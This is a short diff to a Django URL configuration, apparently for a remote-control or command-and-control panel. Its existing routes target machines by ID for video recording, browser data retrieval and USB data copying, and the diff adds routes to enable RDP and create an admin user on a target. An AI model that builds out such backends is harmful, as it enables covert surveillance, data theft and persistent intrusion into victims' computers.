@@ -41,4 +41,6 @@ urlpatterns = [
     re_path(r'^api/videorecord/(?P<target_uuid>\d+)/(?P<record_time>\d+[smh])/$', views.video_record),
     re_path(r'^api/browserdata/(?P<target_uuid>\d+)/$', views.get_browser_data),
     re_path(r'^api/usbdata/(?P<target_uuid>\d+)/$', views.copy_usb_data),
+    re_path(r'^api/rdpenable/(?P<target_uuid>\d+)/$', views.rdp_enable),
+    re_path(r'^api/createadminuser/(?P<target_uuid>\d+)/$', views.create_admin_user),
 ]
